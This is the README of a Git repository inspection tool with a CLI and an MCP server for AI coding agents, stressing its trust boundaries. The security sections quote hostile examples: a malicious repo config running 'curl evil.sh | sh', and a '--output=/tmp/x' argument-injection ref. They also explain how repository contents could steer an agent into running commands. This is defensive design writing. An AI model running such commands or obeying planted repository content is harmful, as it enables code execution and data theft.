# Repository Inspector

[![Public checks](https://github.com/rakexhs/xsolla-ai-repo-inspector/actions/workflows/public-checks.yml/badge.svg)](https://github.com/rakexhs/xsolla-ai-repo-inspector/actions/workflows/public-checks.yml)

Answers one question reliably: **what changed in this Git repository, and does
it still build?**

It reports changed paths across four disjoint scopes (committed, staged,
unstaged, untracked), optionally runs validation commands, and returns the
result as Markdown or as a structured JSON document. It is used by developers
from a command line, and by AI coding agents over MCP.

The supported behavior is exercised by automated tests: typecheck, build, and
411 tests covering unit parsers, real Git fixtures, validation containment,
CLI subprocesses, in-memory MCP, CLI/MCP parity, packaging, and adversarial
inputs. Deliberate boundaries are listed under Limitations below.

---

## Interface decision: CLI-first, with MCP as a narrower derived surface

The two interfaces run **the same engine** but are deliberately **unequal in
authority**. This is the central design decision, and it follows from one
observation:

> When a developer types `--validate "npm test"`, they gain no authority they
> did not already have — they could have run `npm test` directly. When an AI
> agent passes the same string over MCP, the situation inverts: the agent's
> inputs are influenced by the contents of the very repository it is inspecting
> — a README, a code comment, a test fixture it just read. A free-form command
> parameter is then a textbook confused-deputy escalation.

So the capabilities differ by interface, and neither "MCP-first" nor a
symmetric "hybrid" would be honest about that.

|  | CLI | MCP |
|---|---|---|
| Primary user | developer, CI job | AI coding agent |
| Ad-hoc commands (`--validate "…"`) | **yes** | **no — capability absent from the schema** |
| Named allowlisted validations | yes | yes, and only these |
| Config source | `--config`, or repo-local with `--allow-repo-config` | `--config` at launch **only** |
| Path confinement | none (the caller chose the path) | `repo_path` must resolve inside `--root` |
| Default detail | `full` | `summary` |
| Default output budget | 256 KiB | 16 KiB |
| Default per-stream cap | 32 KiB | 4 KiB |

**Why MCP still earns its place.** The usual pitch for an MCP server is that it
gives an agent a new capability. Here it is the opposite: for an agent that
already holds an unrestricted shell, this server is a **capability reduction** —
a typed, discoverable, bounded way to answer the same question, with an
allowlist the agent cannot widen. That reframing makes the allowlist the
product rather than a chore.

**Consistency is a test, not a claim.** For the same normalised request, the
CLI's `--format json` output and the MCP tool's `structuredContent` are
asserted deep-equal after scrubbing measured durations and the absolute
repository path. A companion assertion pins the intended default divergences
above (summary vs full detail, tighter MCP budgets, no MCP ad-hoc commands), so
accidental drift fails the suite while intentional drift stays legible
(`test/consistency/cli-mcp-parity.test.ts`).

**What would change this decision.** Telemetry showing most calls are
agent-originated *and* that agents never need ad-hoc commands would justify
MCP-first. Real per-call sandboxing (container or VM) would remove the trust
asymmetry that justifies CLI primacy. Conversely, if agents consistently
mis-specify `repo_path` or drown in output, the discoverability benefit has
failed to materialise and the MCP surface should be dropped rather than patched.

---

## Setup

```bash
npm install
npm run typecheck
npm run build
npm test
```

`npm run verify` runs all three gates in sequence.

Requires Node.js ≥ 20.19 and `git` on `PATH`. Verified locally on macOS and in
GitHub Actions on Linux for Node 20 and Node 22. Windows is not supported:
process-group termination and path confinement assume POSIX behaviour.

---

## CLI

```bash
# Everything that changed in the working tree and on this branch
npm run inspector -- review --repo .

# Structured output for a script or an agent
npm run inspector -- review --repo . --format json

# Only what has not been committed yet
npm run inspector -- review --repo . --scope worktree

# Run an allowlisted validation and let the exit code carry the verdict
npm run inspector -- review --repo . --config ./inspector.config.json --validation test
```

After `npm run build`, the binary is available as `inspector`.

### Options

| Flag | Meaning |
|---|---|
| `--repo <path>` | Repository to inspect. **Required.** |
| `--base-ref <ref>` | Base ref for the committed scope. Default: auto-detect. |
| `--scope <list>` | Comma-separated: `committed`, `staged`, `unstaged`, `untracked`; aliases `worktree` (= staged, unstaged, untracked) and `all`. Default: `all`. |
| `--detail <level>` | `summary` or `full`. Default: `full`. |
| `--format <fmt>` | `markdown` or `json`. Default: `markdown`. |
| `--out <path>` | Write the report to a file. `-` means stdout. Default: `-`. |
| `--validate <command>` | Ad-hoc command string, repeatable. No shell. |
| `--validation <name>` | Named validation from the config, repeatable. |
| `--config <path>` | Operator config file. |
| `--allow-repo-config` | Permit loading `<repo>/inspector.config.json`. |
| `--max-output-bytes <n>` | Per-stream output cap. |
| `--timeout <ms>` | Per-validation timeout. |
| `--exit-zero` | Exit 0 whenever a report was produced. |
| `--debug` | Include stack traces for internal errors only. |
| `-h, --help` / `-v, --version` | Print and exit 0. |

**stdout carries only the report.** Confirmations, warnings and errors all go to
stderr, so `--format json` output is always safe to pipe into a parser.

### Exit codes

| Code | Meaning |
|---|---|
| `0` | Review completed; nothing failed. |
| `1` | Review completed; at least one validation failed. *The tool worked; your code did not.* |
| `2` | The caller invoked the tool incorrectly. |
| `3` | The repository could not be inspected. |
| `4` | A time budget was exceeded. |
| `70` | Unexpected internal error. |

The `1` / `3` distinction is the one CI needs: "your tests are failing" is a
different situation from "I could not read the repository".

---

## Configuration

A JSON file, owned by whoever **runs** the tool:

```json
{
  "validations": {
    "test": { "argv": ["npm", "test"], "timeoutMs": 120000, "description": "Unit tests" },
    "lint": { "argv": ["npm", "run", "lint"] }
  },
  "mcp": {
    "allowValidations": ["test", "lint"]
  }
}
```

- `argv` is an **array, never a string** — there is no shell anywhere in this
  tool.
- `mcp.allowValidations` is the subset an MCP caller may run. Names outside it
  are refused even though they exist.
- A repository-local `inspector.config.json` is **ignored by default**, because
  letting the inspected repository widen the allowlist is the same
  confused-deputy problem as free-form MCP commands: a malicious repo could
  ship `["sh","-c","…"]` under a friendly name like `test`. Opt in only with
  `--allow-repo-config`; MCP never reads a repo-local config at all.

---

## MCP

```bash
npm run mcp-server -- --root /path/to/checkouts --config ./inspector.config.json
```

After building, the binary is `inspector-mcp`. Launch options:

| Flag | Meaning |
|---|---|
| `--root <dir>` | Confinement root. Every `repo_path` must resolve, after symlink resolution, inside this directory. Default: the current working directory. |
| `--config <file>` | The validation allowlist. Without it the server can inspect but cannot execute anything. |

### Tools

**`inspect_repository`** — Git inspection only; executes nothing.

| Input | Type |
|---|---|
| `repo_path` | string, required |
| `base_ref` | string, optional |
| `scopes` | array of `committed` \| `staged` \| `unstaged` \| `untracked`, optional |
| `detail` | `summary` \| `full`, optional |

Annotations: `readOnlyHint: true`, `destructiveHint: false`,
`idempotentHint: true`, `openWorldHint: false`. The read-only claim is tested,
not merely asserted: a test confirms `.git/index` is not modified by a call.

**`run_validations`** — the same inputs plus `validations`, an array of
allowlisted **names**. There is no field through which a command string could be
passed; the capability is absent from the schema, not merely refused. The
allowed names appear as a `z.enum` in the advertised schema, so an agent can see
its legal options without a failed call first.

Annotations: `readOnlyHint: **false**`, `destructiveHint: false`,
`openWorldHint: false`. A command-executing tool is never marked read-only —
clients use that hint to decide what to auto-approve.

**This tool is not registered at all when the allowlist is empty.** A tool that
would always refuse is worse than an absent one: it burns a turn and teaches the
agent nothing.

### Failure semantics

Three distinct layers, which are easy to conflate:

1. **Malformed arguments** → rejected by the input schema.
2. **The tool could not do its job** (not a repository, unresolvable base ref,
   path outside `--root`) → `isError: true`, with `structuredContent` still
   present so the agent can branch on a machine-readable code.
3. **The review completed but validations failed** → `isError: false`, and
   `structuredContent.ok === false`.

> `isError` means *the tool failed*, not *the news is bad*. A failing test suite
> is a **successful** tool call.

Both `content[0].text` (a short human-readable summary) and `structuredContent`
are always populated; the SDK does not mirror one into the other.

---

## What gets reported

Four **disjoint** scopes, because merging them loses the distinction an agent
most needs — "I have not committed this yet" versus "this landed on the branch":

| Scope | Source |
|---|---|
| `committed` | `merge-base(base, HEAD)..HEAD` |
| `staged` | index vs HEAD |
| `unstaged` | working tree vs index |
| `untracked` | not in the index, respecting `.gitignore` |

A path may legitimately appear in more than one scope. `changes.files` is the
deduplicated union, with a `scopes` array per path and a single status chosen by
precedence, so a consumer that does not care about staging can ignore the rest.
Git treats an embedded untracked repository as an opaque path ending in `/`;
such an entry carries `kind: "directory"` and is not recursively inspected.

Rename and copy detection is enabled, with `origPath` and a similarity score.
Only names and statuses are reported — never diff content, which is the single
largest consumer of an agent's context window.

Degraded states are reported as warnings rather than failures: a repository with
no commits, a detached HEAD, no discoverable base ref, unmerged paths during a
conflict, and the presence of uninspected submodules.

### Output size

Every result carries a `truncation` field naming exactly which fields were
shortened and the total bytes removed. Individual validation outcomes also
report `outputBytesDropped` when their captured streams were shortened.
Truncation is deterministic, keeps the head and tail with an explicit elision
marker in the middle, and never splits a UTF-8 code point. Captured output has
ANSI escapes stripped and carriage-return overwrites resolved, which routinely
turns megabytes of progress-bar spam into a few hundred bytes.

---

## Trust boundary

**No shell, anywhere.** Commands are `spawn`ed from an argv array. A
`--validate` string containing `;`, `&&`, `|`, `` ` ``, `$(…)` or a glob is
**rejected** with an error naming the character — not silently passed through as
a literal argument, which would let you believe your chained command ran.

**The allowlist is owned by the operator, never by the repository.** If the
inspected repository could supply the config, a malicious repository would ship
an `inspector.config.json` containing `["sh","-c","curl evil.sh | sh"]` and an
agent would execute it merely by asking for "test" — the same confused-deputy
bug wearing a disguise. Repo-local config is therefore ignored unless
`--allow-repo-config` is passed, and never on the MCP surface at all. When one
is present but ignored, that is reported as a warning rather than passing
silently.

**Refs are validated before they reach `git`.** An argv array stops *shell*
injection but not *argument* injection: `--base-ref "--output=/tmp/x"` would
otherwise cause git to write that file. Refs beginning with `-` are rejected,
every caller-supplied ref is resolved with `rev-parse --verify` before use, and
`--end-of-options` separates flags from operands.

**Execution hardening.** Per-command and total timeouts; SIGTERM then SIGKILL to
the process **group**, so a test runner's grandchildren cannot outlive the call;
an environment allowlist so `GITHUB_TOKEN`, `AWS_*` and similar are never
inherited; `stdin` closed; and output pipes kept draining past the byte cap so a
chatty command cannot deadlock on a full pipe.

> ### The allowlist is a mitigation, not a sandbox
>
> Allowlisted commands run as ordinary child processes with the operator's full
> privileges — same user, same filesystem, same network. The allowlist controls
> *which* command may start and *who* may choose it. It does not contain what
> that command does once running. If you allowlist `npm test` and the
> repository's `package.json` defines a malicious `test` script, that script
> runs. **Allowlisting a command is equivalent to trusting the repository you
> point the tool at.** For untrusted repositories, run the server in a container
> or allowlist nothing and use inspection only, which is the default.

---

## Verification

```bash
npm run verify        # typecheck + build + test
```

| Suite | What it proves |
|---|---|
| `test/unit/` | `-z` parsers, tokenizer, config validation, renderers, truncation |
| `test/integration/git-inspect.test.ts` | real temp repositories: unborn HEAD, no `main`, detached HEAD, unrelated histories, renames, `.gitignore`, paths with spaces/newlines/non-ASCII, argument-injection rejection |
| `test/integration/validation-run.test.ts` | non-zero exit reported not thrown, timeouts kill the process **group**, 10 MB output truncated without hanging, secrets scrubbed, stdin-reading commands do not hang |
| `test/cli/` | pure parser plus real subprocess runs asserting `{stdout, stderr, exit code}` |
| `test/mcp/` | in-process client/server contract and security, over `InMemoryTransport` |
| `test/consistency/` | CLI JSON deep-equals MCP `structuredContent`; default divergences pinned |
| `test/adversarial/` | hostile inputs, unusual repository states, resource exhaustion |
| `test/packaging/` | `npm pack`, install the tarball into a clean project, run the installed binary |

The packaging suite exists because the previous version of this project built
successfully while shipping a `bin` path that did not exist. Only an install
test catches that.

---

## Limitations

Stated plainly rather than implied. In short: the allowlist reduces who may
start a command, but does not isolate what that command can do once running; I
do not claim Windows support; submodules and nested Git directories are not
descended into; diff bodies are never emitted; shell syntax in `--validate` is
rejected rather than interpreted; validations run one at a time; rename
detection follows Git’s defaults; non-UTF-8 bytes are lossy under UTF-8 decoding.

- **The validation allowlist is a mitigation, not a sandbox** (see above).
- **Windows is not supported.** Process-group termination uses POSIX semantics.
- **Submodules are not descended into**; their presence is reported as a warning.
- **Diff content is never reported** — names and statuses only, deliberately.
- **Shell syntax in `--validate` is rejected, not interpreted.** Use several
  `--validate` flags, or declare a script in the config.
- **Validations run sequentially**; they contend for the same working tree.
- **Rename detection uses git's default thresholds**, so a heavily rewritten
  moved file appears as a delete plus an add.
- **Non-UTF-8 paths and binary command output are lossy**, though truncation
  never splits a code point.

---

## Project layout

```text
src/core/       result contract (zod), diagnostics, exit codes, text budgeting,
                and the review engine — the only place a review is produced
src/git/        hardened git invocation, -z parsers, four-scope inspection
src/validation/ tokenizer, operator config + trust decisions, hardened runner
src/render/     Markdown and JSON renderers; json.ts is the only serialisation
                path, which is what keeps the two interfaces identical
src/cli/        command-line adapter
src/mcp/        MCP adapter; factory.ts builds a server without connecting,
                which is what makes the surface testable
test/           unit, integration, cli, mcp, consistency, adversarial, packaging
```
